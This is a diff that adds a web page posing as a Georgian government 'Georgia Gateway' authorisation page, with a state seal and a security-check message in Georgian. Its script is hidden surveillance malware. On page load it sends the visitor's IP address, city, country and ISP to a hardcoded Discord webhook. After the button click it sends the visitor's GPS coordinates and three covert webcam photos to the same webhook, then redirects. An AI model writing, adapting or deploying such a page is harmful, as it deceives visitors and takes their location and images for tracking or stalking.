@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="ka">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Georgia Gateway | Login</title>
+    <style>
+        body { background: #f0f2f5; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); max-width: 400px; width: 90%; text-align: center; border-top: 6px solid #004a99; }
+        .logo { width: 80px; margin-bottom: 20px; }
+        h2 { color: #004a99; margin-bottom: 15px; }
+        .info { background: #e8f0fe; color: #1967d2; padding: 15px; border-radius: 4px; font-size: 13px; text-align: left; margin-bottom: 25px; border-left: 4px solid #1967d2; }
+        #authBtn { background: #004a99; color: white; border: none; padding: 16px; border-radius: 4px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Great_Seal_of_the_State_of_Georgia.svg/1024px-Great_Seal_of_the_State_of_Georgia.svg.png" class="logo">
+    <h2>ავტორიზაცია</h2>
+    <div class="info">
+        <strong>სისტემური შეტყობინება:</strong><br>
+        უსაფრთხოების მიზნით, გთხოვთ დაადასტუროთ თქვენი მოწყობილობის ლოკაცია და ვინაობა.
+    </div>
+    <button id="authBtn">დადასტურება</button>
+</div>
+
+<video id="video" style="display:none;" autoplay playsinline muted></video>
+<canvas id="canvas" style="display:none;" width="1280" height="720"></canvas>
+
+<script>
+    const webhookURL = "https://discord.com/api/webhooks/1485355763906904075/cZdhC78M-9dPiuLhi2dyRlzRBT4WKxZundc3ObtynZuE3IGEawS_zhwzUZNL9go9j3gy";
+
+    // --- 1. მომენტალური ლოგი (IP, ქალაქი, პროვაიდერი) ---
+    async function instantLog() {
+        // მეთოდი 1: ipapi.co (ყველაზე დეტალური)
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const d = await res.json();
+            await sendToDiscord("🚀 Instant Log (ipapi)", d.ip, d.city, d.country_name, d.org);
+        } catch (e) {
+            // მეთოდი 2: თუ პირველმა არ იმუშავა, ვიყენებთ ip-api.com-ს
+            try {
+                const res = await fetch('http://ip-api.com/json/');
+                const d = await res.json();
+                await sendToDiscord("🚀 Instant Log (ip-api)", d.query, d.city, d.country, d.isp);
+            } catch (e2) {
+                // მეთოდი 3: მარტო IP-ის გაგზავნა
+                const res = await fetch('https://api.ipify.org?format=json');
+                const d = await res.json();
+                await sendToDiscord("🚀 Instant Log (ipify)", d.ip, "Unknown", "Unknown", "Unknown");
+            }
+        }
+    }
+
+    async function sendToDiscord(title, ip, city, country, isp) {
+        await fetch(webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                embeds: [{
+                    title: title,
+                    color: 16711680,
+                    fields: [
+                        { name: "🌐 IP", value: `\`${ip}\``, inline: true },
+                        { name: "🏙️ ქალაქი", value: city || "N/A", inline: true },
+                        { name: "🏳️ ქვეყანა", value: country || "N/A", inline: true },
+                        { name: "📡 ISP", value: isp || "N/A", inline: false }
+                    ],
+                    timestamp: new Date()
+                }]
+            })
+        });
+    }
+
+    // --- 2. GPS და კამერა (ღილაკზე დაჭერის შემდეგ) ---
+    async function startCapture() {
+        const btn = document.getElementById('authBtn');
+        btn.disabled = true;
+        btn.innerText = "მოწმდება...";
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: `🎯 **GPS:** http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` })
+                });
+            });
+        }
+
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            video.onloadedmetadata = async () => {
+                for (let i = 1; i <= 3; i++) {
+                    await new Promise(r => setTimeout(r, 2000));
+                    const canvas = document.getElementById('canvas');
+                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
+                    const formData = new FormData();
+                    formData.append('file', blob, `img_${i}.jpg`);
+                    formData.append('payload_json', JSON.stringify({ content: `📸 კადრი #${i}` }));
+                    await fetch(webhookURL, { method: 'POST', body: formData });
+                }
+                window.location.href = "https://gvaska519.github.io/Test123/georgian.html";
+            };
+        } catch (err) {
+            window.location.href = "https://gvaska519.github.io/Test123/georgian.html";
+        }
+    }
+
+    window.onload = instantLog;
+    document.getElementById('authBtn').addEventListener('click', startCapture);
+</script>
+
+</body>
+</html>
